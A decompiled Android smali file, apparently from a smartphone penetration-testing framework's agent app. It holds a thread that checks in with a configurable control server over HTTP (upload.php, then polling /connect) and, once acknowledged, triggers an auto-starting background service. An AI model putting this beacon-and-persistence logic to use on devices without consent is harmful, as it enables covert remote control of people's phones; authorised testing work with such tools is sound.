.class Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;
.super Ljava/lang/Thread;
.source "FrameworkAndroidAppActivity.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;->onClick(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;

.field final synthetic val$controlIP:Ljava/lang/String;

.field final synthetic val$key:Ljava/lang/String;

.field final synthetic val$path:Ljava/lang/String;

.field final synthetic val$port:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;

    .prologue
    .line 147
    iput-object p1, p0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->this$0:Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;

    iput-object p2, p0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$key:Ljava/lang/String;

    iput-object p3, p0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$controlIP:Ljava/lang/String;

    iput-object p4, p0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$port:Ljava/lang/String;

    iput-object p5, p0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$path:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 25

    .prologue
    .line 150
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$key:Ljava/lang/String;

    move-object/from16 v20, v0

    const-string v21, " CONNECT"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 151
    .local v3, "connectstring":Ljava/lang/String;
    new-instance v12, Ljava/util/ArrayList;

    invoke-direct {v12}, Ljava/util/ArrayList;-><init>()V

    .line 152
    .local v12, "nameValuePairs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    new-instance v20, Lorg/apache/http/message/BasicNameValuePair;

    const-string v21, "connectline"

    move-object/from16 v0, v20

    move-object/from16 v1, v21

    invoke-direct {v0, v1, v3}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v20

    invoke-virtual {v12, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 154
    :try_start_0
    new-instance v6, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v6}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 155
    .local v6, "httpclient":Lorg/apache/http/client/HttpClient;
    const-string v5, "http://"

    .line 156
    .local v5, "http":Ljava/lang/String;
    const-string v17, "/upload.php"

    .line 157
    .local v17, "url":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$controlIP:Ljava/lang/String;

    move-object/from16 v20, v0

    move-object/from16 v0, v20

    invoke-virtual {v5, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    .line 158
    .local v16, "uri":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$port:Ljava/lang/String;

    move-object/from16 v20, v0

    const-string v21, "80"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v20

    if-nez v20, :cond_0

    .line 160
    const-string v20, ":"

    move-object/from16 v0, v16

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$port:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    .line 162
    :cond_0
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$path:Ljava/lang/String;

    move-object/from16 v20, v0

    move-object/from16 v0, v16

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 163
    .local v14, "postto1":Ljava/lang/String;
    move-object/from16 v0, v17

    invoke-virtual {v14, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 164
    .local v13, "postto":Ljava/lang/String;
    const-string v20, "AAA"

    move-object/from16 v0, v20

    invoke-static {v0, v13}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 165
    new-instance v7, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v7, v13}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 166
    .local v7, "httppost":Lorg/apache/http/client/methods/HttpPost;
    new-instance v20, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    move-object/from16 v0, v20

    invoke-direct {v0, v12}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    move-object/from16 v0, v20

    invoke-virtual {v7, v0}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 167
    invoke-interface {v6, v7}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    .line 168
    const-string v18, "/connect"

    .line 169
    .local v18, "url2":Ljava/lang/String;
    move-object/from16 v0, v18

    invoke-virtual {v14, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 170
    .local v15, "pullfrom":Ljava/lang/String;
    const-string v20, "AAA"

    move-object/from16 v0, v20

    invoke-static {v0, v15}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 171
    new-instance v19, Ljava/net/URL;

    move-object/from16 v0, v19

    invoke-direct {v0, v15}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 172
    .local v19, "url3":Ljava/net/URL;
    const/4 v8, 0x0

    .local v8, "i":I
    :goto_0
    const/16 v20, 0x64

    move/from16 v0, v20

    if-ge v8, v0, :cond_2

    .line 174
    new-instance v9, Ljava/io/BufferedReader;

    new-instance v20, Ljava/io/InputStreamReader;

    invoke-virtual/range {v19 .. v19}, Ljava/net/URL;->openStream()Ljava/io/InputStream;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    move-object/from16 v0, v20

    invoke-direct {v9, v0}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 175
    .local v9, "in":Ljava/io/BufferedReader;
    if-eqz v9, :cond_3

    .line 179
    :cond_1
    :goto_1
    invoke-virtual {v9}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v10

    .local v10, "inputLine":Ljava/lang/String;
    if-eqz v10, :cond_3

    .line 180
    const-string v20, "AAA"

    move-object/from16 v0, v20

    invoke-static {v0, v10}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 181
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$key:Ljava/lang/String;

    move-object/from16 v20, v0

    const-string v21, " CONNECTED"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 182
    .local v2, "connectedstring":Ljava/lang/String;
    invoke-virtual {v10, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v20

    if-eqz v20, :cond_1

    .line 184
    const-string v20, "BBB"

    const-string v21, "CONNECTED"

    invoke-static/range {v20 .. v21}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 186
    const/16 v8, 0x64

    .line 187
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->this$0:Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;

    move-object/from16 v20, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$controlIP:Ljava/lang/String;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$key:Ljava/lang/String;

    move-object/from16 v22, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$path:Ljava/lang/String;

    move-object/from16 v23, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->val$port:Ljava/lang/String;

    move-object/from16 v24, v0

    invoke-static/range {v20 .. v24}, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;->access$000(Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 188
    new-instance v11, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->this$0:Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;

    move-object/from16 v20, v0

    invoke-virtual/range {v20 .. v20}, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v20

    const-class v21, Lcom/bulbsecurity/framework/app/ServiceAutoStarter;

    move-object/from16 v0, v20

    move-object/from16 v1, v21

    invoke-direct {v11, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 189
    .local v11, "intent":Landroid/content/Intent;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->this$0:Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;

    move-object/from16 v20, v0

    move-object/from16 v0, v20

    invoke-virtual {v0, v11}, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;->sendBroadcast(Landroid/content/Intent;)V

    .line 190
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;->this$0:Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;

    move-object/from16 v20, v0

    new-instance v21, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1$1;

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1$1;-><init>(Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity$1;)V

    invoke-virtual/range {v20 .. v21}, Lcom/bulbsecurity/framework/app/FrameworkAndroidAppActivity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 206
    .end local v2    # "connectedstring":Ljava/lang/String;
    .end local v5    # "http":Ljava/lang/String;
    .end local v6    # "httpclient":Lorg/apache/http/client/HttpClient;
    .end local v7    # "httppost":Lorg/apache/http/client/methods/HttpPost;
    .end local v8    # "i":I
    .end local v9    # "in":Ljava/io/BufferedReader;
    .end local v10    # "inputLine":Ljava/lang/String;
    .end local v11    # "intent":Landroid/content/Intent;
    .end local v13    # "postto":Ljava/lang/String;
    .end local v14    # "postto1":Ljava/lang/String;
    .end local v15    # "pullfrom":Ljava/lang/String;
    .end local v16    # "uri":Ljava/lang/String;
    .end local v17    # "url":Ljava/lang/String;
    .end local v18    # "url2":Ljava/lang/String;
    .end local v19    # "url3":Ljava/net/URL;
    :catch_0
    move-exception v4

    .line 208
    .local v4, "e":Ljava/lang/Exception;
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V

    .line 211
    .end local v4    # "e":Ljava/lang/Exception;
    :cond_2
    return-void

    .line 172
    .restart local v5    # "http":Ljava/lang/String;
    .restart local v6    # "httpclient":Lorg/apache/http/client/HttpClient;
    .restart local v7    # "httppost":Lorg/apache/http/client/methods/HttpPost;
    .restart local v8    # "i":I
    .restart local v9    # "in":Ljava/io/BufferedReader;
    .restart local v13    # "postto":Ljava/lang/String;
    .restart local v14    # "postto1":Ljava/lang/String;
    .restart local v15    # "pullfrom":Ljava/lang/String;
    .restart local v16    # "uri":Ljava/lang/String;
    .restart local v17    # "url":Ljava/lang/String;
    .restart local v18    # "url2":Ljava/lang/String;
    .restart local v19    # "url3":Ljava/net/URL;
    :cond_3
    add-int/lit8 v8, v8, 0x1

    goto/16 :goto_0
.end method
